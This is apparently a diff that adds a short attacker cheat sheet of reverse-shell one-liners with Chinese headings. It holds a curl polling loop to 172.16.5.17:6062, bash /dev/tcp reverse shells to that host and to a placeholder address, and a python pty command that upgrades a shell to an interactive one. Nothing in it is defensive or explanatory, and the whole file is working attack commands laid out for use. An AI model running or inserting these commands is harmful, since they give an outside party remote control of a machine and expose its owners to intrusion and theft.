@@ -1,0 +1,9 @@
+bash reverse:
+while true;do curl -s http://172.16.5.17:6062/?f=$(curl -s http://10.0.0.2);sleep 60;done"
+
+bash:
+/bin/bash -c '/bin/bash </dev/tcp/ip/port 1>&0 2>&0'
+bash -i >& /dev/tcp/172.16.5.17/6062 0>&1
+
+提升为交互式sh
+python -c 'import pty;pty.spawn("/bin/bash")'
